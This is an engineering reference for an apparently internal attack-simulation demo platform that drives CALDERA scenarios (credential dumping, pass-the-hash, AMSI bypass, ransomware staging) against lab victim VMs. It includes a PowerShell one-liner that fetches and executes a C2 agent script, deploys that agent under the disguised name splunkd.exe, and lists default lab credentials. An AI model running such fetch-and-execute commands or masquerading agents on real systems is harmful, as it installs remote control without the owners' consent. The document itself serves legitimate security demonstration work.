# Sophos Adversary Simulation Platform -- Engineering Reference

> **For AI assistants and engineers:** This document is the single authoritative reference for this codebase. Read it fully before making any changes. All IDs, ports, and configuration values are real -- not placeholders -- unless explicitly marked otherwise.

> **This is NOT the monolith.** This repo (`adversary-sim`) is the standalone attack simulation stack, extracted from the `mdr-demo-lab` monolith. It has no Proxmox, Terraform, Ansible, or Portainer. Infrastructure provisioning lives in LabOps (separate repo). If you need VM management, you are in the wrong repo.

---

## 1. PROJECT PURPOSE

This is a **production SE enablement platform** for running live attack simulations during Sophos customer demos. Sales Engineers (SEs) use it to convert real-world MDR cases into repeatable, audience-specific attack demonstrations mapped to MITRE ATT&CK.

**Who uses it:** Sophos SEs running discovery-phase and proof-of-value demos with prospects.

**What it does:**
- Provides a browser-based SE Console to select an attack scenario and launch it
- Orchestrates the attack via MITRE CALDERA on a real Windows victim VM
- Streams the CALDERA operation feed live (left panel) alongside a live RDP session to the victim desktop (right panel) via Apache Guacamole
- Shows Sophos Endpoint + Sophos XDR detecting real attack techniques in real time
- AI-generates customer-facing narratives via a configurable AI provider (Anthropic Claude, OpenAI, Google Gemini, or local Ollama) when SEs submit new cases via n8n

**What it is NOT:** A lab provisioning tool. VM creation, networking, and infrastructure live in LabOps. SEs never run setup commands -- they open a browser at `http://localhost:8081` and click Launch.

---

## 2. ARCHITECTURE OVERVIEW

```
+-------------------------------------------------------------+
|  Docker Host                                                |
|  Docker bridge network: advsim-net (standalone)             |
|                     or: labops-net (with LabOps)            |
|                                                             |
|  advsim-nginx      172.20.0.51  :8081->80                   |
|    Serves SE Console, proxies /caldera/ /guacamole/ /api/   |
|                                                             |
|  advsim-caldera    172.20.0.10  :8888                       |
|    ARM64, v5.1.0 from private GHCR                          |
|    C2 for sandcat agents on victim VMs                      |
|                                                             |
|  advsim-n8n        172.20.0.31  :5679->5678  (standalone)    |
|    Scenario case ingest + AI enrichment + config/settings   |
|    In labops mode: skipped; workflows imported into         |
|    labops-n8n at 172.20.0.30 instead                        |
|                                                             |
|  advsim-kali       172.20.0.70  :2222->22                   |
|  advsim-atomic     172.20.0.40  (arm64, idle)               |
|                                                             |
|  --- Standalone mode only (no LabOps) ---                   |
|  advsim-guacamole  172.20.0.81  :8085->8080 (amd64/Rosetta)|
|  advsim-guacd      172.20.0.80               (amd64/Rosetta)|
|  advsim-guac-postgres 172.20.0.82            (arm64 native) |
|                                                             |
|  AI Provider (configurable via Settings / ai-config.json)   |
|    Ollama (native):  host.docker.internal:11434             |
|    Cloud: Anthropic / OpenAI / Gemini via API key           |
+-------------------------------------------------------------+
                       |
              Victim VMs (provisioned by LabOps or manually)
              sandcat agent -> C2 back to Docker host :8888
                       |
              Sophos Central / Sophos XDR (cloud, separate tenant)
```

### Docker Services

| Container | Image | IP | External Port | Notes |
|---|---|---|---|---|
| advsim-caldera | caldera:local (GHCR ARM64 v5.1.0) | 172.20.0.10 | 8888 | red/admin, admin/admin |
| advsim-n8n | n8nio/n8n:latest (arm64) | 172.20.0.31 | 5679->5678 | Standalone only. In labops mode, uses labops-n8n at 172.20.0.30 |
| advsim-nginx | nginx:alpine (arm64) | 172.20.0.51 | 8081->80 | -- |
| advsim-atomic | custom build (arm64) | 172.20.0.40 | none | Idle (tail -f /dev/null) |
| advsim-kali | kalilinux/kali-rolling (arm64) | 172.20.0.70 | 2222 | root/kali |
| advsim-guacamole | guacamole/guacamole:latest (**amd64**) | 172.20.0.81 | 8085->8080 | Standalone only |
| advsim-guacd | guacamole/guacd:latest (**amd64**) | 172.20.0.80 | none | Standalone only |
| advsim-guac-postgres | postgres:15-alpine (arm64) | 172.20.0.82 | none | Standalone only |

### Nginx Proxy Routes

| Path | Backend | Purpose |
|---|---|---|
| `/` | nginx static files | SE Console (index.html) |
| `/caldera/` | `172.20.0.10:8888/` | CALDERA REST API (proxied to avoid CORS) |
| `/guacamole/` | `172.20.0.81:8080/guacamole/` | Guacamole web app + WebSocket tunnel |
| `/api/` | `172.20.0.31:5678/webhook/` (standalone) or `172.20.0.30:5678/webhook/` (labops) | n8n webhook endpoints |
| `/scenarios.json` | static file | Scenario catalog read by SE Console |
| `/s.ps1` | static file | Sandcat one-liner bootstrap for victim VMs |
| `/health` | nginx inline | Returns `Adversary Sim OK` (plain text) |

### Docker Volumes

| Volume | Used By | Purpose |
|---|---|---|
| caldera-data | advsim-caldera | CALDERA data persistence |
| n8n-data | advsim-n8n | n8n workflows + credentials (standalone only) |
| guac-db | advsim-guac-postgres | Guacamole connection/user DB (standalone only) |

### Demo Launch Data Flow

1. SE selects scenario in index.html, clicks **Launch Simulation**
2. index.html POSTs directly to `/caldera/api/v2/operations` with adversary ID, planner, group
3. Browser opens `console.html?operation_id=...&victim_ip=...&...`
4. console.html polls `/caldera/api/v2/operations/{id}` every 3s for live feed
5. console.html calls `GET /api/config` to retrieve Guacamole credentials from n8n (not hardcoded)
6. console.html uses Guacamole REST API to create an RDP connection and loads the iframe
7. n8n is NOT in the attack launch path -- it provides config + scenario management only

### Service URLs (localhost)

```
SE Front-End:       http://localhost:8081
Attack Console:     http://localhost:8081/console.html
Admin Panel:        http://localhost:8081/admin.html
Architecture Ref:   http://localhost:8081/architecture.html
CALDERA:            http://localhost:8888
n8n:                http://localhost:5679
Guacamole:          http://localhost:8085/guacamole
Kali SSH:           ssh root@localhost -p 2222
```

---

## 3. KEY FILES MAP

```
adversary-sim/
|
+-- docker-compose.yml              <- Core services (always started: CALDERA, nginx, Kali, Atomic Runner)
+-- docker-compose.n8n.yml          <- n8n stack (standalone mode only)
+-- docker-compose.guacamole.yml    <- Guacamole stack (standalone mode only)
+-- docker-compose.override.yml     <- Auto-generated by make install (gitignored)
+-- Makefile                        <- Primary operational interface (see section 10)
+-- .env                            <- Local secrets (gitignored)
+-- .env.example                    <- Template -- copy to .env
+-- .gitignore
+-- .labops-mode                    <- Auto-generated: "standalone" or "labops" (gitignored)
|
+-- scripts/
|   +-- build-library.py            <- Builds caldera-library.json from caldera-profiles/
|   +-- build-mitre-attack.py       <- Builds mitre-attack.json from ATT&CK STIX bundle
|   +-- detect-labops.sh            <- Checks if labops-net Docker network exists
|
+-- nginx/
|   +-- conf/default.conf           <- Generated from default.conf.tpl by make install
|   +-- conf/default.conf.tpl       <- Nginx config template (N8N_PROXY_IP placeholder)
|   +-- html/                       <- Served at http://localhost:8081/
|       +-- index.html              <- SE Console: scenario picker, launch button, talking points
|       +-- console.html            <- Attack Console: CALDERA feed + Guacamole RDP split panel
|       +-- admin.html              <- Admin panel
|       +-- architecture.html       <- Platform reference for SEs (not customers)
|       +-- scenarios.json          <- Scenario catalog: source of truth for all scenarios
|       +-- ai-config.json          <- AI provider + labopsUrl config (gitignored, written by make install / Settings UI)
|       +-- caldera-library.json    <- CALDERA ability/adversary index for n8n AI prompts
|       +-- mitre-attack.json       <- ATT&CK Enterprise techniques for autocomplete
|       +-- s.ps1                   <- One-liner sandcat bootstrap for Windows victims
|
+-- caldera/
|   +-- conf/local.yml              <- CALDERA configuration: API keys, users, plugins
|                                      crypto keys are PLACEHOLDER -- auto-replaced on install
|
+-- caldera-profiles/
|   +-- load_profiles.py            <- Pushes all abilities + adversaries to CALDERA via REST API
|   +-- abilities/                  <- Per-scenario ability YAML files (PowerShell commands)
|   |   +-- credential-access/     <- SCN-001 (LSASS), SCN-005 (NTLM hash)
|   |   +-- defense-evasion/       <- SCN-006 (AMSI bypass), SCN-008 (disable defenses)
|   |   +-- discovery/             <- SCN-002 (enumeration), SCN-005 (shares)
|   |   +-- execution/             <- SCN-003 (payload), SCN-006 (PS enum, download)
|   |   +-- impact/                <- SCN-008 (shadow copies, ransom note, report)
|   |   +-- lateral-movement/      <- SCN-005 (PtH authentication)
|   |   +-- persistence/           <- SCN-003 (scheduled task, registry runkey)
|   +-- adversaries/                <- Adversary JSON profiles (ability ordering per scenario)
|       +-- scn001-credential-dumping.json
|       +-- scn002-discovery-chain.json
|       +-- scn003-phishing-persistence.json
|       +-- scn005-pass-the-hash.json
|       +-- scn006-powershell-amsi-bypass.json
|       +-- scn008-ransomware-simulation.json
|
+-- guacamole/
|   +-- init/
|       +-- 01-initdb.sql           <- Guacamole PostgreSQL schema + guacadmin seed
|                                      Auto-runs on first postgres start (empty volume)
|
+-- n8n/
|   +-- workflows/
|       +-- case_ingest.json        <- POST /webhook/case-ingest -> AI provider -> scenarios.json
|       +-- export_enrichment.json  <- POST /webhook/scenario-enrich -> AI provider -> scenarios.json
|       +-- scenario_approve.json   <- POST /webhook/scenario-approve -> scenarios.json
|       +-- config_api.json         <- GET /webhook/config -> returns Guac + victim credentials
|       +-- settings_api.json       <- GET/POST /webhook/settings -> reads/writes ai-config.json
|
+-- atomic-runner/
    +-- Dockerfile                  <- ARM64 Ubuntu with Atomic Red Team definitions
    +-- entrypoint.sh
```

---

## 4. CRITICAL GOTCHAS

### 4.1 CALDERA Link Status Pattern

**This will break console.html if you get it wrong.**

In this CALDERA build (v5.1.0), completed links are NOT reliably marked `status=2`. Instead, they are often marked `status=0` with a non-empty `finish` timestamp. Treat a link as "ran" if:

```javascript
// Correct
function linkRan(lk) {
  const s = lk.status;
  return s === 2 || s === -1 || (s === 0 && lk.finish);
}

// Wrong -- misses most completed links
function linkRan(lk) { return lk.status === 2; }
```

This pattern appears in console.html. Do not change it.

### 4.2 n8n Requires NODE_FUNCTION_ALLOW_BUILTIN for File Writes

n8n Code nodes that use `require('fs')` to write `scenarios.json` will silently fail unless the container has this environment variable:

```yaml
NODE_FUNCTION_ALLOW_BUILTIN=fs,path,child_process
```

This is already set in `docker-compose.yml`. If you see n8n workflows failing on the `Write to scenarios.json` step, this is the first thing to check.

The n8n container mounts `./nginx/html` at `/data/scenarios`, so n8n writes directly to the nginx-served `scenarios.json`.

### 4.3 Sandcat Must Be Compiled AMD64

CALDERA runs in an ARM64 container (Apple Silicon). Victim VMs are x86-64 Windows machines. The sandcat agent binary must be cross-compiled:

```bash
make sandcat
# which runs:
docker exec advsim-caldera bash -c "cd /usr/src/app/plugins/sandcat/gocat && \
  GOOS=windows GOARCH=amd64 go build \
  -o /usr/src/app/plugins/sandcat/payloads/sandcat.go-windows sandcat.go"
```

Run this after every fresh `docker compose up` or if agents fail to download the payload. The pre-compiled binary lives in the caldera-data volume -- it does NOT persist if you run `make clean`.

### 4.4 Guacamole and guacd Are amd64-Only (Rosetta)

Both `guacamole/guacamole:latest` and `guacamole/guacd:latest` have no arm64 builds. They run via Docker's Rosetta 2 x86-64 emulation on Apple Silicon. Both are explicitly tagged `platform: linux/amd64` in `docker-compose.guacamole.yml`. This works fine for demo use.

Guacamole is only deployed in **standalone mode**. When LabOps is present, adversary-sim uses the LabOps Guacamole instance on the same Docker network.

### 4.5 Guacamole Credentials Come from /api/config

Unlike the monolith where Guac credentials were hardcoded in console.html, this project serves them from the n8n config API workflow:

```
GET /api/config  ->  n8n webhook  ->  returns { guacAdmin, guacAdminPw, victimUser, victimPass, ... }
```

The credentials are sourced from environment variables in the n8n container (`GUAC_ADMIN_USER`, `GUAC_ADMIN_PASSWORD`, `VICTIM_USER`, `VICTIM_PASSWORD`), which are set in `.env`. If RDP connections fail in console.html, check these values.

### 4.6 CALDERA Crypto Keys Are Auto-Generated

The `caldera/conf/local.yml` file ships with placeholder values (`PLACEHOLDER_SALT_REPLACE_ON_INSTALL` and `PLACEHOLDER_KEY_REPLACE_ON_INSTALL`). The `make install` target auto-replaces these with cryptographically random hex strings via `python3 secrets.token_hex(32)`. Unlike the monolith, there are no static placeholder keys to worry about -- but the generated keys are written directly into the tracked file, so do not commit `local.yml` after installation if the repo is public.

### 4.7 Stale Agents Cause Discard Storms

If multiple sandcat agents are trusted in CALDERA group `red`, the batch planner may try to assign abilities to dead agents and mark them as discarded, causing apparent operation failures. Before launching an operation, untrust all agents except the current one in the CALDERA UI: Campaigns -> Agents -> set Trusted=False for stale agents.

### 4.8 Never Use TextEdit for JSON or YAML Files on Mac

macOS TextEdit converts straight quotes (`"`) to typographic smart quotes, which silently corrupts JSON and YAML files. Always use VS Code, vim, or any real editor.

### 4.9 docker compose vs docker-compose

The Makefile uses `docker compose` (no hyphen -- Docker Desktop Compose V2 plugin). Both forms work if Docker Desktop is current, but all Makefile targets use the `docker compose` form. Do not add a hyphen.

### 4.10 Container Prefix is advsim-*, Not mdr-*

All container names in this project use the `advsim-` prefix. If you see references to `mdr-caldera`, `mdr-nginx`, etc., those are from the monolith and will not resolve in this project.

---

## 5. CALDERA REFERENCE

### Credentials and Keys

```
API Key (red):   MDRLABRED
API Key (blue):  MDRLABBLUE
Login (red):     red / admin
Login (admin):   admin / admin
Login (blue):    blue / admin
API endpoint:    http://localhost:8888/api/v2/
Nginx proxy:     http://localhost:8081/caldera/api/v2/
```

All console.html requests use `/caldera/` (nginx-proxied) to avoid CORS.

### Planner

```
Batch planner ID:  788107d5-dc1e-4204-9269-38df0186d3e7
```

All operations use the batch planner. It runs abilities in a single pass in sequence, matching demo expectations. Do not switch to bucketeer or atomic planners -- they produce unpredictable ordering for demos.

### Agent Group

```
Group: red
```

All sandcat agents on victim VMs check in to group `red`.

### Sandcat Agent

```
Binary:        sandcat.go-windows (must be compiled AMD64 -- see section 4.3)
Deploy path:   C:\Users\Public\splunkd.exe
Download URL:  http://<host>:8888/file/download
Headers:       platform: windows, file: sandcat.go
Launch args:   -server http://<host>:8888 -group red
```

One-liner for victim (served by nginx at `/s.ps1`):
```powershell
powershell -c "iex(iwr 'http://<host>:8081/s.ps1' -UseBasicParsing)"
```

Note: `s.ps1` currently has a hardcoded IP for the CALDERA server. Update it to match your Docker host address before deploying to victims.

### Adversary Profile IDs

| Scenario | Adversary ID | # Abilities |
|---|---|---|
| SCN-001 | scn001-credential-dumping | 3 |
| SCN-002 | scn002-discovery-chain | 4 |
| SCN-003 | scn003-phishing-persistence | 3 |
| SCN-005 | scn005-pass-the-hash | 3 |
| SCN-006 | scn006-powershell-amsi-bypass | 3 |
| SCN-008 | scn008-ransomware-simulation | 4 |

### Ability IDs

```
scn001-a1-check-privs, scn001-a2-lsass-dump-comsvcs, scn001-a3-mimikatz-sekurlsa
scn002-a1-system-discovery, scn002-a2-network-discovery, scn002-a3-process-discovery, scn002-a4-user-enumeration
scn003-a1-payload-execution, scn003-a2-scheduled-task-persistence, scn003-a3-registry-persistence
scn005-a1-enumerate-shares, scn005-a2-extract-ntlm-hash, scn005-a3-pth-authentication
scn006-a1-powershell-enumeration, scn006-a2-amsi-bypass-attempt, scn006-a3-payload-download-exec
scn008-a1-disable-defenses, scn008-a2-delete-shadow-copies, scn008-a3-stage-ransom-note, scn008-a4-impact-report
```

### Launching an Operation via API

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: MDRLABRED" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Demo - SCN-002",
    "adversary": {"adversary_id": "scn002-discovery-chain"},
    "planner": {"id": "788107d5-dc1e-4204-9269-38df0186d3e7"},
    "group": "red",
    "auto_close": false,
    "state": "running",
    "obfuscator": "plain-text"
  }'
```

### CALDERA Config File

`caldera/conf/local.yml` -- mounted read-only into the container. Key settings:
- `crypt_salt` and `encryption_key`: Auto-generated on `make install` (see section 4.6)
- Plugins enabled: access, atomic, compass, debrief, fieldmanual, manx, response, sandcat, stockpile, training
- Agent beacon channel: HTTP on port 8888
- TCP C2: port 7010, UDP: 7011, WebSocket: 7012

---

## 6. N8N WORKFLOW REFERENCE

n8n is at `http://localhost:5679` (credentials set in `.env`).

n8n webhooks are exposed via nginx at `/api/` -> `172.20.0.31:5678/webhook/`.

The `n8n-data` volume persists workflow definitions and credentials. The JSON files in `n8n/workflows/` are the source-of-record for import -- they may not reflect the exact live state in the volume.

### Workflow: Config API

**File:** `n8n/workflows/config_api.json`
**Webhook:** GET `http://localhost:5679/webhook/config`
**Via nginx:** GET `http://localhost:8081/api/config`

Returns Guacamole credentials and victim VM credentials from environment variables. Used by console.html to connect RDP sessions without hardcoding secrets in JavaScript.

Response shape:
```json
{
  "guacProxy": "/guacamole",
  "guacAdmin": "guacadmin",
  "guacAdminPw": "...",
  "guacDs": "postgresql",
  "victimUser": "demo",
  "victimPass": "..."
}
```

### Workflow: Case Ingest

**File:** `n8n/workflows/case_ingest.json`
**Webhook:** POST `http://localhost:5679/webhook/case-ingest`
**Via nginx:** POST `http://localhost:8081/api/case-ingest`

Flow: Webhook -> Parse case JSON -> Build AI prompt -> Route to configured provider (Anthropic/OpenAI/Gemini/Ollama via `ai-config.json`) -> Parse response -> Normalize fields -> Write to `/data/scenarios/scenarios.json` -> Respond 200

### Workflow: Scenario Enrichment

**File:** `n8n/workflows/export_enrichment.json`
**Webhook:** POST `http://localhost:5679/webhook/scenario-enrich`
**Via nginx:** POST `http://localhost:8081/api/scenario-enrich`

Flow: Webhook -> Validate input -> Branch:
- If `needs_enrichment=true`: Build AI prompt -> Enrich with ATT&CK via configured provider -> Write to scenarios.json
- If `scenario_id` provided: Return existing scenario with industry-specific talking points

### Workflow: Scenario Approve

**File:** `n8n/workflows/scenario_approve.json`
**Webhook:** POST `http://localhost:5679/webhook/scenario-approve`
**Via nginx:** POST `http://localhost:8081/api/scenario-approve`

Flow: Webhook -> Check if case exists (by `case_id`) -> If not, build minimal scenario and publish to scenarios.json

### Workflow: Settings API

**File:** `n8n/workflows/settings_api.json`
**Webhook GET:** `http://localhost:5679/webhook/settings`
**Webhook POST:** `http://localhost:5679/webhook/settings-save`
**Via nginx:** GET `http://localhost:8081/api/settings` / POST `http://localhost:8081/api/settings-save`

Reads/writes `ai-config.json` on disk. The config object contains:

```json
{
  "provider": "anthropic|openai|gemini|ollama",
  "apiKey": "...",
  "model": "",
  "labopsUrl": "http://192.168.1.50:8080"
}
```

- GET returns the config with `apiKey` masked (last 4 chars only) and the `labopsUrl` field.
- POST writes the full config (including `labopsUrl`) to `/data/scenarios/ai-config.json`.
- POST `/api/settings/test` tests AI provider connectivity (does not test labopsUrl -- that is tested client-side).

### n8n File Write Requirement

All write workflows write to `/data/scenarios/scenarios.json` using `require('fs')`. This requires:
1. `NODE_FUNCTION_ALLOW_BUILTIN=fs,path,child_process` in docker-compose.yml (already set)
2. The volume mount `./nginx/html:/data/scenarios` in the n8n service (already set)
3. The file must exist before n8n tries to parse it (initialized with at least `{}`)

---

## 7. SCENARIO LIBRARY

### scenarios.json Structure

```json
{
  "version": "1.1",
  "last_updated": "YYYY-MM-DD",
  "scenarios": [ ...scenario objects... ]
}
```

### Scenario Object Schema

```json
{
  "id": "SCN-001",
  "title": "Credential Dumping via LSASS",
  "description": "Customer-facing 1-2 sentence description",
  "mitre_tactics": ["Credential Access"],
  "mitre_techniques": [
    {"id": "T1003.001", "name": "OS Credential Dumping: LSASS Memory"}
  ],
  "tools": ["Mimikatz", "ProcDump"],
  "atomic_tests": ["T1003.001-1"],
  "caldera_ability": "scn001-credential-dumping",
  "audience": "Technical",
  "platform": "windows",
  "execution_engine": "caldera",
  "expected_detections": [
    {"detection": "LSASS memory access by non-system process", "severity": "critical"}
  ],
  "talking_points": {
    "universal": ["..."],
    "financial_services": ["..."],
    "healthcare": ["..."],
    "manufacturing": ["..."]
  },
  "se_runbook": {
    "setup": "Pre-demo notes",
    "steps": ["Step 1", "Step 2"],
    "talking_points_timing": "When to deliver talking points"
  }
}
```

### The caldera_ability Field Convention

Despite the field name, `caldera_ability` holds the **adversary ID** (not an ability ID). When the SE Console launches a CALDERA operation, it sends:

```json
{"adversary": {"adversary_id": "<caldera_ability value>"}}
```

This naming is a historical inconsistency. Do not rename the field -- it would break index.html.

### Production Scenarios (Hand-Authored)

| ID | Title | Audience | CALDERA Adversary |
|---|---|---|---|
| SCN-001 | Credential Dumping via LSASS | Technical | scn001-credential-dumping |
| SCN-002 | Discovery & Enumeration Chain | Technical | scn002-discovery-chain |
| SCN-003 | Phishing -> Payload -> Persistence | Executive | scn003-phishing-persistence |
| SCN-005 | Pass the Hash Lateral Movement | Technical | scn005-pass-the-hash |
| SCN-006 | PowerShell Execution & AMSI Bypass | Technical | scn006-powershell-amsi-bypass |
| SCN-008 | Ransomware Pre-Deployment Simulation | Executive | scn008-ransomware-simulation |

### AI-Generated Scenarios

Scenarios with IDs like `SCN-CASE-XXXXXX` (case-ingest) or `SCN-ENRICH-XXXXXX` (enrichment pipeline) were generated by Ollama. These scenarios include:
- `caldera_adversary_id`: a real adversary ID from the CALDERA library (or blank if no match)
- `launchable: true/false`: `true` means Ollama matched a real adversary and the scenario can be launched
- `status: "pending"` (case-ingest) or `"ephemeral"` (enrichment, expires 24h)

### Adding a New Scenario

1. Create ability YAML files in `caldera-profiles/abilities/<tactic>/`
2. Create adversary JSON in `caldera-profiles/adversaries/`
3. Run `make profiles` to push to CALDERA
4. Add a scenario object to `scenarios.json` with the adversary ID in `caldera_ability`
5. Set `execution_engine: "caldera"` and `audience` appropriately

---

## 8. DEMO RUNBOOK SUMMARY

### Prerequisites

- `make install` has been run (or `make up` if already installed)
- `make sandcat` has been run (AMD64 binary compiled)
- `make profiles` has been run (adversaries loaded in CALDERA)
- AI provider configured (via `make install` prompt or Settings gear icon in SE Console)
- If using Ollama: `ollama serve` + `ollama pull llama3.2:3b`
- At least one victim VM running with sandcat agent deployed
- Guacamole credentials and victim password set in `.env`

### Sandcat Deploy

On victim VM (PowerShell as Admin):
```powershell
powershell -c "iex(iwr 'http://<host>:8081/s.ps1' -UseBasicParsing)"
```

### Happy Path

1. Open `http://localhost:8081` in browser
2. Select a scenario from the catalog (e.g., SCN-002 for first demo -- safest)
3. Enter victim VM IP
4. Select industry vertical (for talking points)
5. Click **Launch Simulation**
6. Attack Console opens at `console.html?operation_id=...&victim_ip=...`
7. Left panel: live CALDERA operation feed (abilities execute, status updates every 3s)
8. Right panel: auto-connects RDP to victim via Guacamole
9. Watch abilities execute -- narrate each step using talking points
10. When done, pivot to Sophos XDR to show real-time detections

### Recommended Scenario Order for a Full Demo

1. **SCN-002** -- Discovery Chain (fastest, lowest risk, good opener)
2. **SCN-001** -- Credential Dumping (escalates to SCN-005)
3. **SCN-005** -- Pass the Hash (continuation of SCN-001)
4. **SCN-008** -- Ransomware Simulation (save for the close)

---

## 9. ENVIRONMENT VARIABLES

### .env File

Copy `.env.example` to `.env`. The `.env` file is gitignored.

| Variable | Purpose | Required? |
|---|---|---|
| `N8N_PASSWORD` | n8n admin UI password | **Yes** |
| `OLLAMA_MODEL` | Model for Ollama enrichment | No (default: `llama3.2:3b`) |
| `AI_PROVIDER` | AI provider: `anthropic`, `openai`, `gemini`, or `ollama` | No (set during install) |
| `AI_API_KEY` | API key for cloud AI providers | No (not needed for Ollama) |
| `AI_MODEL` | Model override (leave blank for provider defaults) | No |
| `GUAC_ADMIN_USER` | Guacamole admin username | No (default: `guacadmin`) |
| `GUAC_ADMIN_PASSWORD` | Guacamole admin password | No (default: `guacadmin`) |
| `VICTIM_USER` | RDP username for victim VMs | No (default: `demo`) |
| `VICTIM_PASSWORD` | RDP password for victim VMs | No (default: empty) |
| `NGINX_PORT` | Override nginx external port | No (default: `8081`) |
| `N8N_PORT` | Override n8n external port | No (default: `5679`) |
| `CALDERA_PORT` | Override CALDERA external port | No (default: `8888`) |
| `GUAC_PORT` | Override Guacamole external port | No (default: `8085`) |
| `KALI_PORT` | Override Kali SSH external port | No (default: `2222`) |
| `TIMEZONE` | Container timezone | No (default: `America/Chicago`) |

### Gitignored Files

```
.env                            <- All lab secrets
.labops-mode                    <- Auto-detected deployment mode
docker-compose.override.yml     <- Auto-generated network config
nginx/html/ai-config.json      <- AI provider config (contains API keys at runtime)
*.tfvars                        <- Terraform secrets (if LabOps co-located)
*.tfstate / *.tfstate.backup    <- Terraform state
.terraform/                     <- Terraform providers
atomic-runner/results/          <- Test output
atomic-runner/tests/            <- Test definitions
```

---

## 10. MAKEFILE TARGETS

| Target | What It Does |
|---|---|
| `make install` | Full first-time setup: checks Docker, prompts AI provider selection, creates .env, detects LabOps, generates CALDERA crypto keys, pulls CALDERA image, starts stack, compiles sandcat, loads profiles, rebuilds MITRE index |
| `make up` | Starts stack (auto-detects standalone vs LabOps mode from `.labops-mode`) |
| `make down` | `docker compose down` |
| `make restart` | `docker compose restart` |
| `make status` | `docker compose ps` -- shows container health |
| `make logs` | `docker compose logs -f` -- tails all container logs |
| `make sandcat` | Cross-compiles `sandcat.go-windows` for AMD64 inside the CALDERA container |
| `make profiles` | Runs `python3 caldera-profiles/load_profiles.py` -- pushes all abilities and adversaries to CALDERA |
| `make library` | Runs `python3 scripts/build-library.py` -- rebuilds `nginx/html/caldera-library.json` from profiles |
| `make mitre-update` | Runs `python3 scripts/build-mitre-attack.py` -- rebuilds `nginx/html/mitre-attack.json` (requires internet) |
| `make clean` | Prompts confirmation, then `docker compose down -v` -- removes all containers AND volumes (destructive) |

---

## 11. SMART NETWORK DETECTION

This project can run in two modes, detected automatically by `scripts/detect-labops.sh`:

### Standalone Mode (default)

When the `labops-net` Docker network does not exist, the Makefile creates `advsim-net` (bridge, subnet `172.20.0.0/24`) and includes `docker-compose.n8n.yml` and `docker-compose.guacamole.yml` to deploy its own n8n and Guacamole stacks. All services are self-contained.

### LabOps Mode

When the `labops-net` Docker network already exists (created by the LabOps platform), the Makefile:
1. Writes `docker-compose.override.yml` to join `labops-net` as an external network
2. Does NOT include `docker-compose.n8n.yml` -- n8n is provided by LabOps at `172.20.0.30`; adversary-sim workflows are imported into `labops-n8n` via `docker exec labops-n8n n8n import:workflow`
3. Does NOT include `docker-compose.guacamole.yml` -- Guacamole is provided by LabOps
4. Generates `nginx/conf/default.conf` from the template (`default.conf.tpl`), setting the `/api/` proxy target to `172.20.0.30` (labops-n8n) instead of `172.20.0.31` (advsim-n8n)
5. All services share the same `172.20.0.0/24` subnet, so nginx proxy routes to Guacamole at `172.20.0.81` work regardless of which stack deployed it

The detection result is cached in `.labops-mode` (gitignored). To force re-detection, delete this file and run `make install` or manually run `scripts/detect-labops.sh > .labops-mode`.

---

*Last updated: 2026-03-16 — Added multi-provider AI support (Anthropic, OpenAI, Gemini, Ollama)*
